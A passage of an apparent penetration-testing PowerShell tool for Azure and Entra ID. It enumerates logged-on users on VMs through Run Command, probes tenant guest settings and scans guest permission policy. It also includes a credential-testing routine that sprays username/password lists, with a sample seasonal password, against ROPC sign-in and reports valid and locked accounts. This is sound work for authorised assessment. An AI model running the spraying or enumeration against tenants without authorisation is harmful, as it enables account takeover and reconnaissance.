                Write-ColorOutput -Message "[*] This subscription may be in a different tenant requiring separate authentication" -Color "Yellow"
                Write-ColorOutput -Message "[*] Tenant ID: $($subscription.TenantId)" -Color "Yellow"
            }
            Write-ColorOutput -Message "[*] Skipping to next subscription...`n" -Color "Yellow"
            continue
        }
        
        # Verify context switch was successful
        $currentContext = Get-AzContext -ErrorAction SilentlyContinue
        if (-not $currentContext -or $currentContext.Subscription.Id -ne $subscription.Id) {
            Write-ColorOutput -Message "[!] Context switch verification failed for: $($subscription.Name)" -Color "Red"
            Write-ColorOutput -Message "[*] Skipping to next subscription...`n" -Color "Yellow"
            continue
        }
        
        # Get VMs in this subscription
        Write-ColorOutput -Message "[*] Retrieving Azure VMs..." -Color "Yellow"
        
        try {
            $vms = @()
            if ($ResourceGroup) {
                $vms = @(Get-AzVM -ResourceGroupName $ResourceGroup -Status -ErrorAction Stop)
                if ($vms.Count -gt 0) {
                    Write-ColorOutput -Message "[+] Retrieved $($vms.Count) VM(s) from resource group: $ResourceGroup" -Color "Green"
                } else {
                    Write-ColorOutput -Message "[*] No VMs found in resource group: $ResourceGroup" -Color "Yellow"
                }
            } else {
                $vms = @(Get-AzVM -Status -ErrorAction Stop)
                if ($vms.Count -gt 0) {
                    Write-ColorOutput -Message "[+] Retrieved $($vms.Count) VM(s) across all resource groups" -Color "Green"
                } else {
                    Write-ColorOutput -Message "[*] No VMs found in this subscription" -Color "Yellow"
                }
            }
        } catch {
            $errorMessage = $_.Exception.Message
            
            # Parse Azure authorization error for cleaner display
            if ($errorMessage -like "*AuthorizationFailed*" -or $errorMessage -like "*does not have authorization*") {
                Write-ColorOutput -Message "[!] Authorization failed for subscription: $($subscription.Name)" -Color "Red"
                Write-ColorOutput -Message "[*] You don't have permission to list VMs in this subscription" -Color "Yellow"
                Write-ColorOutput -Message "[*] Skipping to next subscription...`n" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "[!] Error retrieving VMs: $errorMessage" -Color "Red"
                Write-ColorOutput -Message "[*] Skipping to next subscription...`n" -Color "Yellow"
            }
            continue
        }
        
        if ($vms.Count -eq 0) {
            Write-ColorOutput -Message "[*] No VMs to enumerate in this subscription`n" -Color "Yellow"
            continue
        }
        
        $totalVMsFound += $vms.Count
        
        # Apply VM filter
        $filteredVMs = $vms
        if ($VMFilter -ne "all") {
            $filteredVMs = @($vms | Where-Object {
                $powerState = ($_.PowerState -split ' ')[-1]
                if ($VMFilter -eq "running") {
                    # Match running or available states
                    $powerState -match "running|available"
                } elseif ($VMFilter -eq "stopped") {
                    # Not running/available
                    $powerState -notmatch "running|available"
                } else {
                    $true
                }
            })
            Write-ColorOutput -Message "[*] Filtered to $($filteredVMs.Count) VM(s) with status: $VMFilter`n" -Color "Cyan"
        }
        
        if ($filteredVMs.Count -eq 0) {
            Write-ColorOutput -Message "[*] No VMs matching filter: $VMFilter`n" -Color "Yellow"
            continue
        }
        
        $totalVMsQueried += $filteredVMs.Count
        
        # Enumerate VMs in this subscription
        foreach ($vm in $filteredVMs) {
        $vmName = $vm.Name
        $vmResourceGroup = $vm.ResourceGroupName
        $powerState = ($vm.PowerState -split ' ')[-1]
        $osType = $vm.StorageProfile.OsDisk.OsType
        
        # Check if VM is in a running/available state
        # Azure may report different states: "running", "Available", "VM running", etc.
        $isRunning = $powerState -match "running|available"
        $stateColor = if ($isRunning) { "Green" } else { "Yellow" }
        
        Write-ColorOutput -Message "[*] VM: $vmName" -Color "White"
        Write-ColorOutput -Message "    Resource Group: $vmResourceGroup" -Color "Gray"
        Write-ColorOutput -Message "    OS Type: $osType" -Color "Gray"
        Write-ColorOutput -Message "    Power State: $powerState" -Color $stateColor
        
        # Only query running/available VMs
        if (-not $isRunning) {
            Write-ColorOutput -Message "    [!] VM is not in running state - skipping query" -Color "Yellow"
            $failedQueries++
            Write-Host ""
            continue
        }
        
        # Prepare script based on OS type
        $scriptContent = ""
        $scriptId = ""
        
        if ($osType -eq "Windows") {
            $scriptContent = @"
# Query logged-on users using quser (same as Remote Registry Service would show)
try {
    `$users = quser 2>&1 | Select-Object -Skip 1
    if (`$users) {
        `$users | ForEach-Object {
            if (`$_ -match '^\s*(\S+)\s+(\S*)\s+(\d+)\s+(\S+)\s+(.+)$') {
                `$username = `$matches[1]
                `$sessionName = `$matches[2]
                `$id = `$matches[3]
                `$state = `$matches[4]
                `$idleTime = `$matches[5]
                Write-Output "USER:`$username|SESSION:`$sessionName|ID:`$id|STATE:`$state|IDLE:`$idleTime"
            }
        }
    } else {
        Write-Output "NO_USERS_LOGGED_ON"
    }
} catch {
    Write-Output "ERROR:`$(`$_.Exception.Message)"
}
"@
            $scriptId = "RunPowerShellScript"
        } else {
            # Linux
            $scriptContent = @"
#!/bin/bash
# Query logged-on users (equivalent to Windows Remote Registry Service)
users_output=`$(who 2>&1)
if [ `$? -eq 0 ] && [ -n "`$users_output" ]; then
    echo "`$users_output" | awk '{print "USER:" `$1 "|TTY:" `$2 "|LOGIN:" `$3 " " `$4 "|FROM:" `$5}'
else
    echo "NO_USERS_LOGGED_ON"
fi
"@
            $scriptId = "RunShellScript"
        }
        
        # Execute Run Command
        Write-ColorOutput -Message "    [*] Querying logged-on users..." -Color "Yellow"
        
        try {
            $result = Invoke-AzVMRunCommand -ResourceGroupName $vmResourceGroup -VMName $vmName -CommandId $scriptId -ScriptString $scriptContent -ErrorAction Stop
            
            $output = $result.Value[0].Message
            
            # Clean up Azure RunCommand output artifacts
            # Remove "Enable succeeded:", "[stdout]", "[stderr]" and other metadata
            $output = $output -replace "Enable succeeded:", ""
            $output = $output -replace "\[stdout\]", ""
            $output = $output -replace "\[stderr\]", ""
            $output = $output.Trim()
            
            if ($output -match "NO_USERS_LOGGED_ON") {
                Write-ColorOutput -Message "    [+] Query successful - No users currently logged on" -Color "Cyan"
                $successfulQueries++
            } elseif ($output -match "ERROR:") {
                $errorMsg = ($output -split "ERROR:")[1]
                Write-ColorOutput -Message "    [!] Error querying users: $errorMsg" -Color "Red"
                $failedQueries++
            } else {
                $loggedOnUsers = @()
                $lines = $output -split "`n" | Where-Object { $_.Trim() -ne "" -and $_ -notmatch "^\s*$" }
                
                foreach ($line in $lines) {
                    if ($osType -eq "Windows") {
                        if ($line -match "USER:([^|]+)\|SESSION:([^|]*)\|ID:([^|]+)\|STATE:([^|]+)\|IDLE:(.+)") {
                            $loggedOnUsers += [PSCustomObject]@{
                                Subscription = $subscription.Name
                                SubscriptionId = $subscription.Id
                                VM = $vmName
                                ResourceGroup = $vmResourceGroup
                                OSType = $osType
                                Username = $matches[1].Trim()
                                SessionName = $matches[2].Trim()
                                SessionID = $matches[3].Trim()
                                State = $matches[4].Trim()
                                IdleTime = $matches[5].Trim()
                                Location = ""
                            }
                        }
                    } else {
                        # Linux
                        if ($line -match "USER:([^|]+)\|TTY:([^|]*)\|LOGIN:([^|]+)\|FROM:(.*)") {
                            $loggedOnUsers += [PSCustomObject]@{
                                Subscription = $subscription.Name
                                SubscriptionId = $subscription.Id
                                VM = $vmName
                                ResourceGroup = $vmResourceGroup
                                OSType = $osType
                                Username = $matches[1].Trim()
                                SessionName = $matches[2].Trim()
                                SessionID = "-"
                                State = "Active"
                                IdleTime = "-"
                                Location = $matches[4].Trim()
                            }
                        }
                    }
                }
                
                if ($loggedOnUsers.Count -gt 0) {
                    Write-ColorOutput -Message "    [+] Found $($loggedOnUsers.Count) logged-on user(s):" -Color "Green"
                    
                    foreach ($user in $loggedOnUsers) {
                        $displayName = $user.Username
                        $displayState = $user.State
                        $displaySession = if ($user.SessionName) { $user.SessionName } else { "console" }
                        
                        # NetExec style output
                        Write-ColorOutput -Message "        [*] $displayName" -Color "Cyan"
                        Write-ColorOutput -Message "            Session: $displaySession | State: $displayState | Idle: $($user.IdleTime)" -Color "Gray"
                        if ($user.Location) {
                            Write-ColorOutput -Message "            From: $($user.Location)" -Color "Gray"
                        }
                    }
                    
                    $exportData += $loggedOnUsers
                    $totalLoggedOnUsers += $loggedOnUsers.Count
                    $successfulQueries++
                } else {
                    Write-ColorOutput -Message "    [!] Query returned data but could not parse users" -Color "Yellow"
                    Write-ColorOutput -Message "    [*] Raw output: $output" -Color "Gray"
                    $failedQueries++
                }
            }
        } catch {
            $errorMessage = $_.Exception.Message
            
            # Check for common permission issues
            if ($errorMessage -like "*AuthorizationFailed*" -or $errorMessage -like "*Microsoft.Compute/virtualMachines/runCommand/action*") {
                Write-ColorOutput -Message "    [!] Authorization failed - Missing 'Virtual Machine Contributor' role or 'runCommand' permission" -Color "Red"
            } elseif ($errorMessage -like "*VM agent*" -or $errorMessage -like "*GuestAgent*") {
                Write-ColorOutput -Message "    [!] VM Guest Agent is not running or not installed" -Color "Red"
            } elseif ($errorMessage -like "*timeout*") {
                Write-ColorOutput -Message "    [!] Query timed out - VM may be unresponsive" -Color "Red"
            } else {
                Write-ColorOutput -Message "    [!] Failed to query users: $errorMessage" -Color "Red"
            }
            
            $failedQueries++
            }
            
            Write-Host ""
        } # End VM loop
        
        Write-ColorOutput -Message "[*] Subscription enumeration complete`n" -Color "Green"
    } # End subscription loop
    
    # Summary across all subscriptions
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] MULTI-SUBSCRIPTION ENUMERATION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Subscriptions Scanned: $($subscriptionsToScan.Count)" -Color "White"
    Write-ColorOutput -Message "[*] Total VMs Found: $totalVMsFound" -Color "White"
    Write-ColorOutput -Message "[*] VMs Queried (after filters): $totalVMsQueried" -Color "White"
    Write-ColorOutput -Message "[*] Successful Queries: $successfulQueries" -Color "Green"
    Write-ColorOutput -Message "[*] Failed Queries: $failedQueries" -Color "Red"
    Write-ColorOutput -Message "[*] Total Logged-On Users Found: $totalLoggedOnUsers" -Color "Cyan"
    
    # Export if requested
    if ($ExportPath -and $exportData.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            switch ($extension) {
                ".csv" {
                    $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -ErrorAction Stop
                    Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
                }
                ".json" {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -ErrorAction Stop
                    Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
                }
                ".html" {
                    $stats = @{
                        "Subscriptions Scanned" = $subscriptionsToScan.Count
                        "Total VMs Found" = $totalVMsFound
                        "VMs Queried" = $totalVMsQueried
                        "Successful Queries" = $successfulQueries
                        "Failed Queries" = $failedQueries
                        "Total Logged-On Users" = $totalLoggedOnUsers
                    }
                    
                    Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Azure VM Logged-On Users" -Statistics $stats -CommandName "vm-loggedon" -Description "Enumeration of logged-on users on Azure VMs (equivalent to Remote Registry Service)"
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
                default {
                    Write-ColorOutput -Message "`n[!] Unsupported export format. Use .csv, .json, or .html" -Color "Red"
                }
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    } elseif ($ExportPath -and $exportData.Count -eq 0) {
        Write-ColorOutput -Message "`n[!] No data to export" -Color "Yellow"
    }
    
    # Helpful tips
    if ($failedQueries -gt 0) {
        Write-ColorOutput -Message "`n[*] TIP: To query VMs, you need:" -Color "Yellow"
        Write-ColorOutput -Message "    - 'Virtual Machine Contributor' role OR 'Reader' + 'Virtual Machine Command Executor' role" -Color "Yellow"
        Write-ColorOutput -Message "    - VM Guest Agent must be running on each VM" -Color "Yellow"
        Write-ColorOutput -Message "    - VMs must be in 'running' state" -Color "Yellow"
    }
    
    # Multi-subscription tips
    if ($subscriptionsToScan.Count -gt 1 -and -not $SubscriptionId) {
        Write-ColorOutput -Message "`n[*] MULTI-SUBSCRIPTION SCAN:" -Color "Cyan"
        Write-ColorOutput -Message "    - Scanned $($subscriptionsToScan.Count) subscriptions automatically" -Color "Cyan"
        Write-ColorOutput -Message "    - Use -SubscriptionId to target a specific subscription" -Color "Cyan"
        Write-ColorOutput -Message "    - Export includes subscription information for each user" -Color "Cyan"
        
        # Show which subscriptions had issues
        $failedSubs = $subscriptionsToScan | Where-Object { 
            $subId = $_.Id
            -not ($exportData | Where-Object { $_.SubscriptionId -eq $subId })
        }
        if ($failedSubs.Count -gt 0) {
            Write-ColorOutput -Message "`n[*] Subscriptions with issues (0 VMs or errors):" -Color "Yellow"
            foreach ($sub in $failedSubs) {
                Write-ColorOutput -Message "    • $($sub.Name) - Try: .\azx.ps1 vm-loggedon -SubscriptionId $($sub.Id)" -Color "Yellow"
            }
        }
    }
    
    if ($totalLoggedOnUsers -gt 0) {
        Write-ColorOutput -Message "`n[*] NEXT STEPS:" -Color "Cyan"
        Write-ColorOutput -Message "    - Investigate logged-on users for privileged accounts" -Color "Cyan"
        Write-ColorOutput -Message "    - Correlate with Azure AD sign-in logs: .\azx.ps1 sessions" -Color "Cyan"
        Write-ColorOutput -Message "    - Check for stale sessions or suspicious activity" -Color "Cyan"
        if ($subscriptionsToScan.Count -gt 1) {
            Write-ColorOutput -Message "    - Review users across multiple subscriptions for anomalies" -Color "Cyan"
        }
    }
    
    return $exportData
}

# Main guest enumeration function
function Invoke-GuestEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$Password,
        [string]$UserFile,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Guest Login Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')" -Color "Yellow"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        # Method 1: Try to extract from username if provided
        if ($Username -and $Username -like "*@*") {
            $detectedDomain = ($Username -split "@")[1]
            Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
        }
        
        # Method 2: Try to get UPN from whoami command (Windows)
        if (-not $detectedDomain) {
            try {
                if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                    $upn = whoami /upn 2>$null
                    if ($upn -and $upn -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                    }
                }
            } catch {
                # Silent catch
            }
        }
        
        # Method 3: Try environment variable for USERDNSDOMAIN
        if (-not $detectedDomain) {
            $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
            if ($envDomain) {
                $detectedDomain = $envDomain
                Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
            }
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            Write-ColorOutput -Message "[!] Or provide a full email username: -Username user@example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: ROPC Authentication Testing`n" -Color "Yellow"
    
    # Phase 1: Check if tenant accepts external/guest authentication (unauthenticated)
    Write-ColorOutput -Message "[*] Phase 1: Checking tenant guest configuration (unauthenticated)..." -Color "Yellow"
    
    $guestConfig = Test-GuestLoginEnabled -Domain $Domain
    
    # Format output like nxc
    if ($guestConfig.TenantExists) {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists" -Color "Green"
        
        if ($guestConfig.NameSpaceType) {
            $nsColor = if ($guestConfig.NameSpaceType -eq "Managed") { "Cyan" } else { "Yellow" }
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] NameSpaceType: $($guestConfig.NameSpaceType)" -Color $nsColor
        }
        
        if ($guestConfig.IsFederated) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Enabled ($($guestConfig.FederationType))" -Color "Yellow"
            if ($guestConfig.AuthUrl) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Auth URL: $($guestConfig.AuthUrl)" -Color "DarkGray"
            }
        } else {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Managed (Cloud-only)" -Color "Cyan"
        }
        
        if ($guestConfig.AcceptsExternalUsers) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External/Guest users: Likely ENABLED (B2B)" -Color "Green"
        }
    } else {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found or not accessible" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message ""
    
    # Phase 2: Test authentication if credentials provided
    if ($Username -or $UserFile) {
        Write-ColorOutput -Message "[*] Phase 2: Testing guest authentication..." -Color "Yellow"
        
        $credentialsToTest = @()
        $results = @()
        
        # Single username/password test
        if ($Username) {
            if ($Username -notlike "*@*") {
                $Username = "$Username@$Domain"
            }
            $credentialsToTest += @{
                Username = $Username
                Password = if ($Password) { $Password } else { "" }
            }
        }
        
        # Load from file
        if ($UserFile) {
            if (-not (Test-Path $UserFile)) {
                Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            } else {
                try {
                    $fileContent = Get-Content $UserFile -ErrorAction Stop
                    foreach ($line in $fileContent) {
                        $line = $line.Trim()
                        if ($line -and $line -notlike "#*") {
                            # Format: username:password or just username
                            if ($line -like "*:*") {
                                $parts = $line -split ":", 2
                                $user = $parts[0].Trim()
                                $pass = $parts[1]
                            } else {
                                $user = $line
                                $pass = if ($Password) { $Password } else { "" }
                            }
                            
                            if ($user -notlike "*@*") {
                                $user = "$user@$Domain"
                            }
                            
                            $credentialsToTest += @{
                                Username = $user
                                Password = $pass
                            }
                        }
                    }
                    Write-ColorOutput -Message "[*] Loaded $($credentialsToTest.Count) credential(s) from file" -Color "Green"
                } catch {
                    Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
                }
            }
        }
        
        Write-ColorOutput -Message "[*] Testing $($credentialsToTest.Count) credential(s)...`n" -Color "Yellow"
        
        foreach ($cred in $credentialsToTest) {
            $authResult = Test-GuestAuthentication -Username $cred.Username -Password $cred.Password -TenantId $Domain
            
            $displayUser = $cred.Username
            if ($displayUser.Length -gt 35) {
                $displayUser = $displayUser.Substring(0, 32) + "..."
            }
            
            $passDisplay = if ($cred.Password -eq "") { "(empty)" } else { "(password)" }
            
            if ($authResult.Success) {
                if ($authResult.MFARequired) {
                    # Valid creds but MFA needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - MFA REQUIRED" -Color "Yellow"
                } elseif ($authResult.ConsentRequired) {
                    # Valid creds but consent needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - CONSENT REQUIRED" -Color "Yellow"
                } else {
                    # Full success - we got a token!
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] SUCCESS! Got access token $passDisplay" -Color "Green"
                }
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $true
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = ($null -ne $authResult.AccessToken)
                }
            } else {
                # Authentication failed
                $errorMsg = switch ($authResult.ErrorCode) {
                    "INVALID_CREDENTIALS" { "[-] Invalid credentials" }
                    "USER_NOT_FOUND" { "[-] User not found" }
                    "ACCOUNT_LOCKED" { "[!] ACCOUNT LOCKED" }
                    "ACCOUNT_DISABLED" { "[-] Account disabled" }
                    "PASSWORD_EXPIRED" { "[!] PASSWORD EXPIRED (valid user)" }
                    "ROPC_DISABLED" { "[!] ROPC disabled (try device code flow)" }
                    "APP_NOT_FOUND" { "[-] Application not found in tenant" }
                    default { "[-] Failed: $($authResult.ErrorCode)" }
                }
                
                $errorColor = if ($authResult.AccountLocked -or $authResult.PasswordExpired) { "Yellow" } else { "DarkGray" }
                
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + $errorMsg -Color $errorColor
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $false
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = $false
                }
            }
            
            # Small delay to avoid lockouts
            Start-Sleep -Milliseconds 100
        }
        
        # Summary
        $successCount = ($results | Where-Object { $_.Success }).Count
        $mfaCount = ($results | Where-Object { $_.MFARequired }).Count
        $lockedCount = ($results | Where-Object { $_.ErrorCode -eq "ACCOUNT_LOCKED" }).Count
        
        Write-ColorOutput -Message "`n[*] Authentication Test Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Total Tested:    $($results.Count)" -Color "Cyan"
        Write-ColorOutput -Message "    Valid Creds:     $successCount" -Color $(if ($successCount -gt 0) { "Green" } else { "DarkGray" })
        Write-ColorOutput -Message "    MFA Required:    $mfaCount" -Color $(if ($mfaCount -gt 0) { "Yellow" } else { "DarkGray" })
        Write-ColorOutput -Message "    Accounts Locked: $lockedCount" -Color $(if ($lockedCount -gt 0) { "Red" } else { "DarkGray" })
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                $exportData = [PSCustomObject]@{
                    Domain = $Domain
                    TenantConfig = $guestConfig
                    AuthResults = $results
                    Summary = @{
                        TotalTested = $results.Count
                        ValidCredentials = $successCount
                        MFARequired = $mfaCount
                        LockedAccounts = $lockedCount
                    }
                }
                
                if ($extension -eq ".csv") {
                    $results | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        # If we got valid credentials, offer to enumerate as guest
        $validCreds = $results | Where-Object { $_.Success -and -not $_.MFARequired -and $_.HasToken }
        if ($validCreds) {
            Write-ColorOutput -Message "`n[*] Valid credentials found! You can now enumerate as a guest user:" -Color "Green"
            Write-ColorOutput -Message "    .\azx.ps1 hosts   # Enumerate devices" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 groups  # Enumerate groups" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 pass-pol # Check password policies`n" -Color "Cyan"
        }
        
    } else {
        # No credentials provided - just show what's accessible without auth
        Write-ColorOutput -Message "[*] No credentials provided. Testing unauthenticated access..." -Color "Yellow"
        Write-ColorOutput -Message "[*] To test guest authentication, use:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user@domain.com -Password 'pass'" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user -Password ''  # Empty password test" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -UserFile users.txt -Password 'Summer2024!'" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] File format (one per line):" -Color "Yellow"
        Write-ColorOutput -Message "    username                 # Uses -Password for all" -Color "DarkGray"
        Write-ColorOutput -Message "    username:password        # Specific password per user" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com          # Full UPN" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com:password # Full UPN with password`n" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "[*] Guest enumeration complete!" -Color "Green"
}

# Helper function to test guest user permissions
function Test-GuestUserPermissions {
    param(
        [string]$TestType  # "Users", "Groups", "Devices", "Applications", "DirectoryRoles"
    )
    
    $result = [PSCustomObject]@{
        TestType = $TestType
        Accessible = $false
        ItemCount = 0
        Error = $null
        PermissionLevel = "None"
    }
    
    try {
        switch ($TestType) {
            "Users" {
                $users = Get-MgUser -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($users | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Groups" {
                $groups = Get-MgGroup -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($groups | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Devices" {
                $devices = Get-MgDevice -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($devices | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Applications" {
                $apps = Get-MgApplication -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($apps | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "DirectoryRoles" {
                $roles = Get-MgDirectoryRole -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($roles | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
        }
    } catch {
        $result.Error = $_.Exception.Message
        $result.Accessible = $false
    }
    
    return $result
}

# Helper function to get guest permission level from policy
function Get-GuestPermissionLevel {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        $guestRoleId = $authPolicy.GuestUserRoleId
        
        # Map GuestUserRoleId to permission level
        # a0b1b346-4d3e-4e8b-98f8-753987be4970 = Guest user access (most permissive - default before 2018)
        # 10dae51f-b6af-4016-8d66-8c2a99b929b3 = Guest users have limited access to properties and memberships of directory objects (default 2018-2021)
        # 2af84b1e-32c8-42b7-82bc-daa82404023b = Guest user access is restricted to properties and memberships of their own directory objects (most restrictive - recommended)
        
        $permissionLevel = switch ($guestRoleId) {
            "a0b1b346-4d3e-4e8b-98f8-753987be4970" { "Same as member users (CRITICAL)" }
            "10dae51f-b6af-4016-8d66-8c2a99b929b3" { "Limited (MEDIUM)" }
            "2af84b1e-32c8-42b7-82bc-daa82404023b" { "Restricted (GOOD)" }
            default { "Unknown ($guestRoleId)" }
        }
        
        return [PSCustomObject]@{
            GuestUserRoleId = $guestRoleId
            PermissionLevel = $permissionLevel
            IsVulnerable = ($guestRoleId -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970")
            IsRestricted = ($guestRoleId -eq "2af84b1e-32c8-42b7-82bc-daa82404023b")
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            GuestUserRoleId = $null
            PermissionLevel = "Unknown"
            IsVulnerable = $false
            IsRestricted = $false
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

# Helper function to check external collaboration settings
function Get-ExternalCollaborationSettings {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        
        # Check if external users can be invited
        $allowInvites = $authPolicy.AllowInvitesFrom
        $allowedToInvite = $authPolicy.AllowedToSignUpEmailBasedSubscriptions
        
        return [PSCustomObject]@{
            AllowInvitesFrom = $allowInvites
            AllowEmailSubscriptions = $allowedToInvite
            BlockMsolPowerShell = $authPolicy.BlockMsolPowerShell
            DefaultUserRolePermissions = $authPolicy.DefaultUserRolePermissions
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            AllowInvitesFrom = "Unknown"
            AllowEmailSubscriptions = $null
            BlockMsolPowerShell = $null
            DefaultUserRolePermissions = $null
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

# Main guest vulnerability scanner function
function Invoke-GuestVulnScanEnumeration {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Guest User Vulnerability Scanner" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest-Vuln-Scan (Azure Null Session Security Assessment)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --check-null-session + security audit`n" -Color "Yellow"
    
    $scanResults = [PSCustomObject]@{
        Domain = $Domain
        ScanDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase1_Unauthenticated = @{}
        Phase2_Authenticated = @{}
        Vulnerabilities = @()
        RiskScore = 0
        Summary = @{}
    }
    
    # ============================================
    # PHASE 1: UNAUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 1: Unauthenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            # Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Try environment variable
